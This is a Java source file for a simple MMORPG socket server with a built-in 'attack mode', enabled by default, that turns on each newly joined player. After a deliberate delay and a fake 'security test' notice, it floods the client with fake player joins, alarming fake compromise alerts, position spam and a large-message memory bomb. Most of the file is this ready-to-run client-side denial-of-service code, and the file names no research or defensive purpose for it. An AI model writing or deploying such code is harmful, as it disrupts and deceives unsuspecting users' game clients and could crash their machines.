import java.io.*;
import java.net.*;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;

public class MMORPGServer {
    private static final int PORT = 12345;
    private static Map<String, PlayerHandler> players = new ConcurrentHashMap<>();
    
    // Attack configuration
    private static final boolean ATTACK_MODE = true; // Toggle attack on/off
    private static final int FAKE_PLAYERS_COUNT = 500; // Number of fake players to spawn
    private static final int MESSAGE_FLOOD_COUNT = 100; // Number of spam messages
    
    public static void main(String[] args) {
        try (ServerSocket serverSocket = new ServerSocket(PORT)) {
            System.out.println("MMORPG Server is running on port " + PORT);
            System.out.println("⚠️ ATTACK MODE: " + (ATTACK_MODE ? "ENABLED" : "DISABLED"));
            
            while (true) {
                Socket clientSocket = serverSocket.accept();
                PlayerHandler playerHandler = new PlayerHandler(clientSocket);
                new Thread(playerHandler).start();
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    
    public static synchronized void broadcast(String message, PlayerHandler sender) {
        for (PlayerHandler player : players.values()) {
            if (player != sender) {
                player.sendMessage(message);
            }
        }
    }
    
    public static synchronized void updatePlayerPosition(
            String playerName,
            String positionData
    ) {
        String message = "UPDATE:" + playerName + ":" + positionData;
        broadcast(message, players.get(playerName));
    }
    
    public static synchronized void addPlayer(
            String playerName,
            PlayerHandler playerHandler
    ) {
        players.put(playerName, playerHandler);
    }
    
    public static synchronized void removePlayer(String playerName) {
        players.remove(playerName);
    }
    
    // ============ ATTACK METHODS ============
    
    /**
     * Attack 1: Spawn massive number of fake players
     * This floods the client with player join notifications
     */
    public static void spawnFakePlayers(PlayerHandler victim) {
        System.out.println("[ATTACK] Spawning " + FAKE_PLAYERS_COUNT + " fake players on " + victim.playerName);
        
        new Thread(() -> {
            for (int i = 0; i < FAKE_PLAYERS_COUNT; i++) {
                String fakePlayerName = "Bot_" + i + "_" + UUID.randomUUID().toString().substring(0, 8);
                victim.sendMessage("PLAYER_JOIN:" + fakePlayerName);
                
                // Also send fake position updates
                int x = (int) (Math.random() * 1000);
                int y = (int) (Math.random() * 1000);
                victim.sendMessage("UPDATE:" + fakePlayerName + ":" + x + "," + y);
                
                // Small delay to not crash immediately (can remove for more aggressive attack)
                try {
                    Thread.sleep(10);
                } catch (InterruptedException e) {
                    break;
                }
            }
            System.out.println("[ATTACK] Fake player spawn complete");
        }).start();
    }
    
    /**
     * Attack 2: Message flood
     * Overwhelms the client with rapid messages
     */
    public static void messageFlood(PlayerHandler victim) {
        System.out.println("[ATTACK] Flooding " + victim.playerName + " with messages");
        
        new Thread(() -> {
            for (int i = 0; i < MESSAGE_FLOOD_COUNT; i++) {
                victim.sendMessage("BROADCAST:⚠️ SYSTEM ALERT #" + i + " - YOUR CONNECTION IS COMPROMISED!");
                victim.sendMessage("BROADCAST:🚨 WARNING: Unauthorized access detected!");
                victim.sendMessage("BROADCAST:💀 Your game data is being corrupted...");
                
                try {
                    Thread.sleep(50); // Adjust for intensity
                } catch (InterruptedException e) {
                    break;
                }
            }
            System.out.println("[ATTACK] Message flood complete");
        }).start();
    }
    
    /**
     * Attack 3: Rapid position updates
     * Makes the client process thousands of position changes
     */
    public static void positionSpam(PlayerHandler victim) {
        System.out.println("[ATTACK] Spamming position updates on " + victim.playerName);
        
        new Thread(() -> {
            for (int i = 0; i < 1000; i++) {
                for (int j = 0; j < 5; j++) {
                    String fakePlayer = "Ghost_" + j;
                    int x = (int) (Math.random() * 10000);
                    int y = (int) (Math.random() * 10000);
                    victim.sendMessage("UPDATE:" + fakePlayer + ":" + x + "," + y);
                }
                
                try {
                    Thread.sleep(20);
                } catch (InterruptedException e) {
                    break;
                }
            }
            System.out.println("[ATTACK] Position spam complete");
        }).start();
    }
    
    /**
     * Attack 4: Memory bomb - send huge messages
     * Forces client to allocate large amounts of memory
     */
    public static void memoryBomb(PlayerHandler victim) {
        System.out.println("[ATTACK] Deploying memory bomb on " + victim.playerName);
        
        new Thread(() -> {
            // Create very long strings to consume memory
            StringBuilder hugeMessage = new StringBuilder();
            for (int i = 0; i < 10000; i++) {
                hugeMessage.append("XXXXXXXXXX");
            }
            
            for (int i = 0; i < 50; i++) {
                victim.sendMessage("DATA:" + hugeMessage.toString());
                
                try {
                    Thread.sleep(100);
                } catch (InterruptedException e) {
                    break;
                }
            }
            System.out.println("[ATTACK] Memory bomb complete");
        }).start();
    }
    
    /**
     * Combined attack - launches all attacks simultaneously
     */
    public static void launchFullAttack(PlayerHandler victim) {
        System.out.println("[ATTACK] ⚠️ LAUNCHING FULL ATTACK ON: " + victim.playerName);
        
        // Delay each attack slightly to maximize impact
        new Thread(() -> {
            spawnFakePlayers(victim);
            try { Thread.sleep(2000); } catch (InterruptedException e) {}
            
            messageFlood(victim);
            try { Thread.sleep(1000); } catch (InterruptedException e) {}
            
            positionSpam(victim);
            try { Thread.sleep(1000); } catch (InterruptedException e) {}
            
            memoryBomb(victim);
        }).start();
    }
}

class PlayerHandler implements Runnable {
    private Socket socket;
    private PrintWriter out;
    private BufferedReader in;
    public String playerName; // Changed to public for attack methods
    
    public PlayerHandler(Socket socket) {
        this.socket = socket;
    }
    
    @Override
    public void run() {
        try {
            in = new BufferedReader(
                    new InputStreamReader(socket.getInputStream())
            );
            out = new PrintWriter(socket.getOutputStream(), true);
            
            out.println("Enter your player name: ");
            playerName = in.readLine();
            MMORPGServer.addPlayer(playerName, this);
            System.out.println(playerName + " has joined the game.");
            
            // Welcome message
            sendMessage("Welcome to the MMORPG, " + playerName + "!");
            
            // ============ TRIGGER ATTACK ON JOIN ============
            if (MMORPGServer.ATTACK_MODE) {
                // Wait a moment before attacking (so they think everything is normal)
                Thread.sleep(3000);
                
                sendMessage("⚠️ SERVER NOTICE: Initiating 'security test'...");
                
                // Choose attack type:
                // Option 1: Full attack (most intense)
                MMORPGServer.launchFullAttack(this);
                
                // Option 2: Individual attacks (uncomment one):
                // MMORPGServer.spawnFakePlayers(this);
                // MMORPGServer.messageFlood(this);
                // MMORPGServer.positionSpam(this);
                // MMORPGServer.memoryBomb(this);
            }
            
            String message;
            while ((message = in.readLine()) != null) {
                if (message.startsWith("MOVE:")) {
                    String positionData = message.substring(5);
                    System.out.println(playerName + " moved to: " + positionData);
                    MMORPGServer.updatePlayerPosition(playerName, positionData);
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        } catch (InterruptedException e) {
            System.out.println("Attack interrupted for " + playerName);
        } finally {
            try {
                MMORPGServer.removePlayer(playerName);
                socket.close();
                System.out.println(playerName + " has left the game.");
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
    
    public void sendMessage(String message) {
        out.println(message);
    }
}
